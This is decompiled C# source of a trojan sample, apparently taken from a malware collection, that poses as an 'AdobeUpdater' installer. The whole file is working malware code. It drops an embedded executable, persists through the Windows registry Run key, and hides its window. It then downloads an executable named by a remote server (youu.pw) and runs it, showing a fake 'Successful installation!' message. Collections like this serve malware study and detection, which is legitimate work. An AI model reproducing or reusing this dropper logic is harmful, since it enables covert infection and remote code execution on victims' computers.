// Decompiled with JetBrains decompiler
// Type: WindowsFormsApplication5.Form1
// Assembly: AdobeUpdater, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 73A4E206-089F-4A54-8E77-A09C22E9679F
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.Win32.Blocker.bnxj-b46bf74247734d5433f0d5c6759124131c2c2080cf8bd47c40d81417b0f05416.exe

using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Reflection;
using System.Windows.Forms;

namespace WindowsFormsApplication5
{
  public class Form1 : Form
  {
    public static string programDirectory = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
    public static string extensionDirectory = Form1.programDirectory + "\\VExtension";
    public static string exeName = "NewMeTrue1.exe";
    public static string copyName = "StartMe";
    public static string projectName = "AdobeUpdater";
    public static string fileVersion = FileVersionInfo.GetVersionInfo(Assembly.GetExecutingAssembly().Location).FileVersion;
    public static string checkUrl = "http://www.youu.pw/extFiles/check40.txt";
    public static string targetPath = Path.Combine(Form1.programDirectory, Form1.copyName + ".exe");
    public static string sourcePath = Application.ExecutablePath;
    private IContainer components = (IContainer) null;
    private ProgressBar progressBar1;
    private Label label1;

    public Form1() => this.InitializeComponent();

    public void SaveLibrary(string name)
    {
      using (Stream manifestResourceStream = this.GetType().Assembly.GetManifestResourceStream("AdobeUpdater.Dependecies." + name))
      {
        byte[] buffer = new byte[manifestResourceStream.Length];
        manifestResourceStream.Read(buffer, 0, buffer.Length);
        using (Stream stream = (Stream) new FileStream(Form1.targetPath, FileMode.Create))
          stream.Write(buffer, 0, buffer.Length);
      }
    }

    private void label1_Click(object sender, EventArgs e)
    {
    }

    private void ProgressChanged(object sender, DownloadProgressChangedEventArgs m) => this.progressBar1.Value = m.ProgressPercentage;

    private void Completed(object sender, AsyncCompletedEventArgs e)
    {
      this.label1.Text = "Successful installation!";
      Process.Start(Form1.programDirectory + "\\" + Form1.exeName);
      this.label1.Text = "Successful installation!";
    }

    private void Form1_Load_1(object sender, EventArgs e)
    {
      if (Process.GetCurrentProcess().ProcessName != Form1.copyName && !System.IO.File.Exists(Form1.targetPath))
      {
        this.SaveLibrary(Form1.copyName + ".exe");
        Registry.CurrentUser.OpenSubKey("SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", true).SetValue(Form1.projectName, (object) ("\"" + Form1.targetPath + "\""));
        Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue(Form1.projectName, (object) ("\"" + Form1.targetPath + "\""));
      }
      if (Process.GetCurrentProcess().ProcessName == Form1.copyName)
      {
        Registry.CurrentUser.OpenSubKey("SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", true).SetValue(Form1.projectName, (object) ("\"" + Form1.targetPath + "\""));
        Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue(Form1.projectName, (object) ("\"" + Form1.targetPath + "\""));
        if (Directory.Exists(Form1.extensionDirectory))
        {
          this.Close();
          Application.Exit();
        }
        this.Visible = false;
        this.Opacity = 0.0;
        this.ShowInTaskbar = false;
      }
      this.label1.Text = "Please Wait, check for config files.";
      WebClient webClient = new WebClient();
      webClient.Headers["User-Agent"] = "WebClient For Extensions";
      string uriString = webClient.DownloadString(new Uri(Form1.checkUrl));
      if (uriString.IndexOf(".exe") != -1)
      {
        webClient.DownloadFileCompleted += new AsyncCompletedEventHandler(this.Completed);
        webClient.DownloadProgressChanged += new DownloadProgressChangedEventHandler(this.ProgressChanged);
        webClient.Headers["User-Agent"] = "WebClient For Extensions";
        webClient.DownloadFileAsync(new Uri(uriString), Form1.programDirectory + "\\" + Form1.exeName);
      }
      else
      {
        int num = (int) MessageBox.Show("PROBLEM!");
      }
    }

    private void progressBar1_Click(object sender, EventArgs e)
    {
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Form1));
      this.progressBar1 = new ProgressBar();
      this.label1 = new Label();
      this.SuspendLayout();
      this.progressBar1.Location = new Point(15, 40);
      this.progressBar1.Name = "progressBar1";
      this.progressBar1.Size = new Size(260, 40);
      this.progressBar1.TabIndex = 0;
      this.progressBar1.Click += new EventHandler(this.progressBar1_Click);
      this.label1.AutoSize = true;
      this.label1.Font = new Font("Verdana", 9.75f, FontStyle.Bold, GraphicsUnit.Point, (byte) 162);
      this.label1.Location = new Point(12, 9);
      this.label1.Name = "label1";
      this.label1.Size = new Size(52, 16);
      this.label1.TabIndex = 1;
      this.label1.Text = "label1";
      this.label1.Click += new EventHandler(this.label1_Click);
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(287, 88);
      this.Controls.Add((Control) this.label1);
      this.Controls.Add((Control) this.progressBar1);
      this.FormBorderStyle = FormBorderStyle.FixedToolWindow;
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = nameof (Form1);
      this.Text = Form1.projectName;
      this.Load += new EventHandler(this.Form1_Load_1);
      this.ResumeLayout(false);
      this.PerformLayout();
    }
  }
}
